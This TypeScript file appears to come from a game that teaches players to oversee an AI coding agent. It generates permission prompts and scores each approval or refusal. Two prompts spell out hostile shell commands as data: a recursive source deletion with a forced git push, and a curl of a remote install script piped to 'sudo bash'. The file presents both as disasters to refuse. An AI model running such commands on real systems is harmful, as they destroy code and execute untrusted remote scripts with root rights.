import type { BlockedEvent } from '../game/types'

export function makeBlockedEvent(projectName: string, autoEdits: boolean, slow: boolean, rand: () => number): BlockedEvent {
  const pool: BlockedEvent[] = []

  if (!autoEdits) {
    const file = ['src/App.tsx', 'styles.css', 'index.html', 'src/main.tsx'][Math.floor(rand() * 4)]
    pool.push(
      {
        kind: 'edit',
        title: 'Permission required',
        detail: `Edit file: ${projectName}/${file}`,
        options: [
          { label: 'Yes', effect: 'continue' },
          { label: "Yes, and don't ask again this session", effect: 'always' },
          { label: 'No', effect: 'deny' },
        ],
      },
      {
        kind: 'edit',
        title: 'Permission required',
        detail: `Create file: ${projectName}/src/utils.ts`,
        options: [
          { label: 'Yes', effect: 'continue' },
          { label: "Yes, and don't ask again this session", effect: 'always' },
          { label: 'No', effect: 'deny' },
        ],
      },
    )
  }

  pool.push(
    {
      kind: 'bash',
      title: 'Run command?',
      detail: '$ npm install -D vitest',
      options: [
        { label: 'Yes', effect: 'continue' },
        { label: 'No', effect: 'deny' },
      ],
    },
    {
      kind: 'danger',
      title: 'Run command?',
      detail: '$ rm -rf ./src && git push --force origin main',
      options: [
        { label: 'Yes', effect: 'disaster' },
        { label: 'No! That deletes the code.', effect: 'caught' },
      ],
    },
    {
      kind: 'danger',
      title: 'Run command?',
      detail: '$ curl http://sketchy-site.xyz/install.sh | sudo bash',
      options: [
        { label: 'Yes', effect: 'disaster' },
        { label: 'No, I don\'t trust that script.', effect: 'caught' },
      ],
    },
    {
      kind: 'question',
      title: 'Agent has a question',
      detail: 'How should I store the data?',
      options: [
        { label: 'Keep it simple: local state / localStorage is fine.', effect: 'continue' },
        { label: 'Set up Postgres, Redis and a message queue.', effect: 'overkill' },
      ],
    },
    {
      kind: 'question',
      title: 'Agent has a question',
      detail: 'The build has 2 failing type errors. What should I do?',
      options: [
        { label: 'Fix the types properly.', effect: 'continue' },
        { label: 'Add // @ts-ignore everywhere.', effect: 'disaster' },
      ],
    },
  )

  if (!slow) {
    pool.push({
      kind: 'context',
      title: 'Context window 92% full',
      detail: 'Responses will get slower and less accurate. Compact the conversation now?',
      options: [
        { label: '/compact', effect: 'compact' },
        { label: 'Keep going', effect: 'slow' },
      ],
    })
  }

  return pool[Math.floor(rand() * pool.length)]
}
